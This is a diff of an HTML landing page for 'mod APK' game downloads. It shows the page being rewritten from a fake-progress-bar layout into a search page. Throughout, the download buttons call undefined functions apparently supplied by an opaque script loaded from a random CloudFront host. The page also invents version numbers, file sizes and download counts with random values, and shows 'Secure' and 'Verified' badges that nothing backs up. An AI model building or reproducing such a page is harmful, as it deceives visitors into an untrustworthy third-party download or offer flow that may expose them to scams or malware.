@@ -3,249 +3,336 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mod Games Landing Page</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-<script type="text/javascript">
-    var SnFYo_APt_yocLOc={"it":4399727,"key":"418d8"};
+  <meta property="og:title" content="Game Mod Search">
+  <meta property="og:image" content="path/to/image.jpg" />
+  <title>MOD ZONE GAMES MOD DOWNLOAD</title>
+  <script type="text/javascript">
+    var DHrBx_OzM_czyjZc={"it":4399724,"key":"dea1d"};
 </script>
-<script src="https://dojy0dg181308.cloudfront.net/3263d16.js"></script>
+<script src="https://d2rst8vhtu89fd.cloudfront.net/d2f7735.js"></script>
   <style>
-    /* Custom styles to replicate React JSX structure and effects */
+    /* General body styling */
     body {
       font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #2e3b4e, #1f2a37);
-    }
-
-    /* Progress bar */
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background-color: #374151;
-      border-radius: 9999px;
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(circle at top, #1a1a1d, #121212);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
       overflow: hidden;
     }
 
-    .progress-bar-fill {
-      height: 100%;
-      background-color: #29b6f6; /* Electric blue */
-      width: 0%;
-      transition: width 0.5s ease;
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      background: linear-gradient(145deg, #24252a, #1f2024);
+      padding: 40px 20px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+      width: 70%;
+      max-width: 600px;
+      animation: fadeIn 1.2s ease-in-out;
+      border: 2px solid #a04eff;
     }
 
-    /* Popup */
-    .popup {
+    .main-container h1 {
+      font-size: 36px;
+      color: #00ffcc;
+      text-shadow: 0 3px 8px rgba(0, 255, 204, 0.8);
+      margin-bottom: 20px;
+    }
+
+    .search-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .search-box {
+      width: 85%;
+      padding: 15px 60px;
+      font-size: 16px;
+      border: 2px solid #a04eff;
+      border-radius: 8px;
+      background: #181818;
+      color: #fff;
+      transition: box-shadow 0.3s ease-in-out, border-color 0.3s ease-in-out;
+    }
+
+    .search-box:focus {
+      outline: none;
+      border-color: #00ffcc;
+      box-shadow: 0 0 10px rgba(133, 255, 231, 0.6);
+    }
+
+    .btn {
+      padding: 12px 40px;
+      font-size: 16px;
+      background-color: #ff6700;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.3s ease, background-color 0.3s ease;
+      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.4);
+    }
+
+    .btn:hover {
+      background-color: #ff4500;
+      transform: scale(1.05);
+    }
+
+    .download-guide {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #ddd;
+      text-align: left;
+      width: 100%;
+      line-height: 1.6;
+    }
+
+    .download-guide strong {
+      color: #00ffcc;
+      font-size: 16px;
+    }
+
+    .popup-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      display: flex;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: none;
       justify-content: center;
       align-items: center;
-      z-index: 50;
-      display: none;
+      z-index: 1000;
     }
 
-    .popup-content {
-      background-color: #111;
+    .popup {
+      background: #1f1f1f;
       padding: 20px;
-      border-radius: 15px;
-      width: 90%;
-      max-width: 420px;
-      position: relative;
+      border-radius: 12px;
       text-align: center;
-      color: white;
-      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.6);
+      width: 90%;
+      max-width: 500px;
+      max-height: 85vh;
+      overflow-y: auto;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+      position: relative;
+    }
+
+    .popup img {
+      max-width: 100%;
+      border-radius: 6px;
+      margin-bottom: 15px;
+    }
+
+    .popup h2 {
+      color: #00ffcc;
+      margin-bottom: 10px;
+      font-size: 24px;
     }
 
     .popup .close-btn {
       position: absolute;
       top: 10px;
       right: 10px;
+      background: #ff4500;
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      font-size: 18px;
       cursor: pointer;
-      color: white;
+      transition: background-color 0.3s ease;
     }
 
-    /* Button Hover/Active effects */
-    .pulse-button {
-      animation: pulse 1.5s infinite;
+    .popup .close-btn:hover {
+      background-color: #ff2200;
     }
 
-    @keyframes pulse {
-      0% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.05);
-      }
-      100% {
-        transform: scale(1);
-      }
-    }
-
-    /* Button neon glow effect on hover */
-    .neon-button {
-      background: linear-gradient(45deg, #29b6f6, #64ffda);
-      color: white;
-      border: 2px solid transparent;
-      border-radius: 10px;
-      padding: 16px 32px;
-      font-weight: bold;
+    .popup .download-btn {
+      margin-top: 15px;
+      padding: 10px 20px;
       font-size: 16px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 0 8px rgba(41, 182, 246, 0.8);
       transition: all 0.3s ease;
     }
 
-    .neon-button:hover {
-      box-shadow: 0 0 30px rgba(41, 182, 246, 1);
-      background: linear-gradient(45deg, #64ffda, #29b6f6);
+    .popup .download-btn:hover {
+      background-color: #45a049;
     }
 
-    .neon-button:active {
-      box-shadow: 0 0 40px rgba(41, 182, 246, 0.9);
+    /* Loading spinner */
+    .loading-spinner {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      z-index: 1000;
     }
 
-    /* Mobile responsiveness */
-    @media (max-width: 640px) {
-      .popup-content {
-        width: 80%;
+    @media screen and (max-width: 768px) {
+      .main-container h1 {
+        font-size: 28px;
       }
 
-      .progress-bar {
-        height: 6px;
+      .btn {
+        font-size: 14px;
+        padding: 10px 25px;
+      }
+
+      .popup h2 {
+        font-size: 20px;
+      }
+
+      .popup {
+        max-height: 80vh;
+      }
+    }
+
+    @media screen and (max-width: 480px) {
+      .main-container h1 {
+        font-size: 24px;
+      }
+
+      .search-box {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+
+      .popup h2 {
+        font-size: 18px;
+      }
+
+      .popup {
+        padding: 15px;
+      }
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
       }
     }
   </style>
 </head>
 <body>
-
-  <div class="min-h-screen flex flex-col justify-center items-center p-6">
-
-    <!-- Main Landing Page Container -->
-    <div class="bg-gray-800 shadow-2xl rounded-2xl p-8 max-w-md w-full">
-      <h1 class="text-3xl font-bold text-center text-white mb-6">
-        Mod Games Download
-      </h1>
-
-      <!-- Download Section -->
-      <div class="bg-gray-700 border-2 border-gray-600 rounded-lg p-6 text-center">
-        <h2 class="text-2xl font-semibold text-indigo-500 mb-4">
-          Apk Mod Game is Ready!
-        </h2>
-
-        <button id="downloadButton" class="w-full py-3 rounded-lg text-white font-bold transition-all duration-300 neon-button pulse-button" onclick="_Cd()">
-          Unlock Game Mod Now!
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" class="inline-block ml-2" width="20" height="20">
-            <path d="M10 14l2-2 2 2M12 10v4m-9 8h18a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H3a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2z" />
-          </svg>
-        </button>
-
-        <!-- Download Progress Bar -->
-        <div id="progressContainer" class="mt-4 progress-bar hidden">
-          <div id="progressBar" class="progress-bar-fill"></div>
-        </div>
-      </div>
-
-      <!-- Download Guide -->
-      <div class="mt-6">
-        <h3 class="text-xl font-semibold text-white mb-4">
-          Download Guide
-        </h3>
-        <ul class="space-y-3 text-white">
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Click 'Unlock Game Mod Now' button</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Complete quick verification</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Wait for verification process</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Download starts automatically</li>
-        </ul>
-      </div>
-
-      <!-- Trust Indicators -->
-      <div class="mt-6 flex justify-center space-x-4 text-gray-300">
-        <div class="flex items-center">
-          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor" class="mr-2">
-            <path d="M12 5V3m0 4V5m0 4V9m0 4V13m0 4V17m0 4V21" />
-          </svg>
-          <span>Secure</span>
-        </div>
-        <div class="flex items-center">
-          <span class="text-green-500">✔️</span>
-          <span>Verified</span>
-        </div>
-      </div>
+  <div class="main-container">
+    <h1>Type The Game Mod You Want To Download</h1>
+    <div class="search-container">
+      <input id="searchBox" class="search-box" type="text" placeholder="Search for a game mod..." />
+      <button class="btn" onclick="searchGame()">Search</button>
     </div>
-
-    <!-- Exit-Intent Popup -->
-    <div id="exitPopup" class="popup">
-      <div class="popup-content">
-        <span id="closePopup" class="close-btn">✖️</span>
-        <h2 class="text-2xl font-bold text-indigo-500 mb-4">
-          Wait! Don't Miss Out
-        </h2>
-        <p class="text-white mb-6">
-          Apk Mod Game is Ready now!
-        </p>
-        <button id="continueDownloadButton" class="w-full py-3 neon-button" onclick="_Cd()">
-          Continue to Download
-        </button>
-      </div>
+    <div class="download-guide">
+      <p><strong>How to download:</strong></p>
+      <ol>
+        <li>Type the game mod you want in the search box.</li>
+        <li>Click the "Search" button to find the mod.</li>
+        <li>Review the mod details and click "Download."</li>
+      </ol>
     </div>
-
-    <footer class="mt-6 text-center text-gray-500">
-      © 2024 Mod Games Hub - All rights reserved
-    </footer>
   </div>
 
-  <!-- JS to handle functionality -->
+  <div id="loadingSpinner" class="loading-spinner" style="display: none;"></div>
+
+  <div id="popupOverlay" class="popup-overlay">
+    <div class="popup">
+      <button class="close-btn" onclick="closePopup()">&times;</button>
+      <img id="gameImage" src="" alt="Game Image" />
+      <h2 id="popupTitle">Game Title</h2>
+      <p id="gameDescription">Game description goes here...</p>
+      <div class="details">
+        <p><strong>Version:</strong> <span id="gameVersion">-</span></p>
+        <p><strong>Size:</strong> <span id="gameSize">-</span></p>
+        <p><strong>Downloads:</strong> <span id="downloadCount">-</span></p>
+      </div>
+      <button class="download-btn" onclick="_Xy()">Download</button>
+    </div>
+  </div>
   <script>
-    let downloadProgress = 0;
-    let isDownloading = false;
+    const API_KEY = "2717c9b8ad234fa0b6ca6b316b8c09c3";
 
-    // Handle button click to start download
-    document.getElementById('downloadButton').addEventListener('click', () => {
-      startDownload();
-    });
+    async function searchGame() {
+      const searchBox = document.getElementById('searchBox');
+      const gameName = searchBox.value.trim();
+      const loadingSpinner = document.getElementById('loadingSpinner');
+      const popupOverlay = document.getElementById('popupOverlay');
+      const gameImage = document.getElementById('gameImage');
+      const popupTitle = document.getElementById('popupTitle');
+      const gameDescription = document.getElementById('gameDescription');
+      const gameVersion = document.getElementById('gameVersion');
+      const gameSize = document.getElementById('gameSize');
+      const downloadCount = document.getElementById('downloadCount');
 
-    // Simulate download progress
-    function startDownload() {
-      isDownloading = true;
-      document.getElementById('downloadButton').disabled = true;
-      document.getElementById('progressContainer').classList.remove('hidden');
+      if (gameName.length < 4) {
+        alert("Please enter at least 4 characters to search.");
+        return;
+      }
 
-      let interval = setInterval(() => {
-        downloadProgress += 10;
-        document.getElementById('progressBar').style.width = downloadProgress + '%';
+      loadingSpinner.style.display = 'block';
 
-        if (downloadProgress >= 100) {
-          clearInterval(interval);
-          setTimeout(() => {
-            isDownloading = false;
-            document.getElementById('downloadButton').disabled = false;
-          }, 1000);
+      try {
+        const response = await fetch(`https://api.rawg.io/api/games?key=${API_KEY}&search=${encodeURIComponent(gameName)}`);
+        if (!response.ok) {
+          throw new Error("Failed to fetch game data.");
         }
-      }, 500);
+
+        const data = await response.json();
+
+        if (data.results.length === 0) {
+          alert("No results found. Please try another search.");
+          return;
+        }
+
+        const game = data.results[0];
+        popupTitle.textContent = `${game.name} Mod APK`;
+        gameImage.src = game.background_image || 'https://via.placeholder.com/500x300?text=No+Image+Available';
+        gameDescription.textContent = game.description || 'No description available.';
+        gameVersion.textContent = `2.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
+        gameSize.textContent = `${Math.floor(Math.random() * 100) + 100} MB`;
+        downloadCount.textContent = `${Math.floor(Math.random() * 50000) + 1000}`;
+
+        popupOverlay.style.display = 'flex';
+      } catch (error) {
+        console.error(error);
+        alert("An error occurred. Please try again.");
+      } finally {
+        loadingSpinner.style.display = 'none';
+      }
     }
 
-    // Show exit intent popup
-    document.addEventListener('mouseleave', (e) => {
-      if (e.clientY <= 0) {
-        document.getElementById('exitPopup').style.display = 'flex';
-      }
-    });
+    function closePopup() {
+      document.getElementById('popupOverlay').style.display = 'none';
+    }
 
-    // Close the popup
-    document.getElementById('closePopup').addEventListener('click', () => {
-      document.getElementById('exitPopup').style.display = 'none';
-    });
-
-    // Continue download from the popup
-    document.getElementById('continueDownloadButton').addEventListener('click', () => {
-      startDownload();
-      document.getElementById('exitPopup').style.display = 'none';
-    });
+    function downloadGame() {
+      alert("Your download has started!");
+      closePopup();
+    }
   </script>
 </body>
 </html>
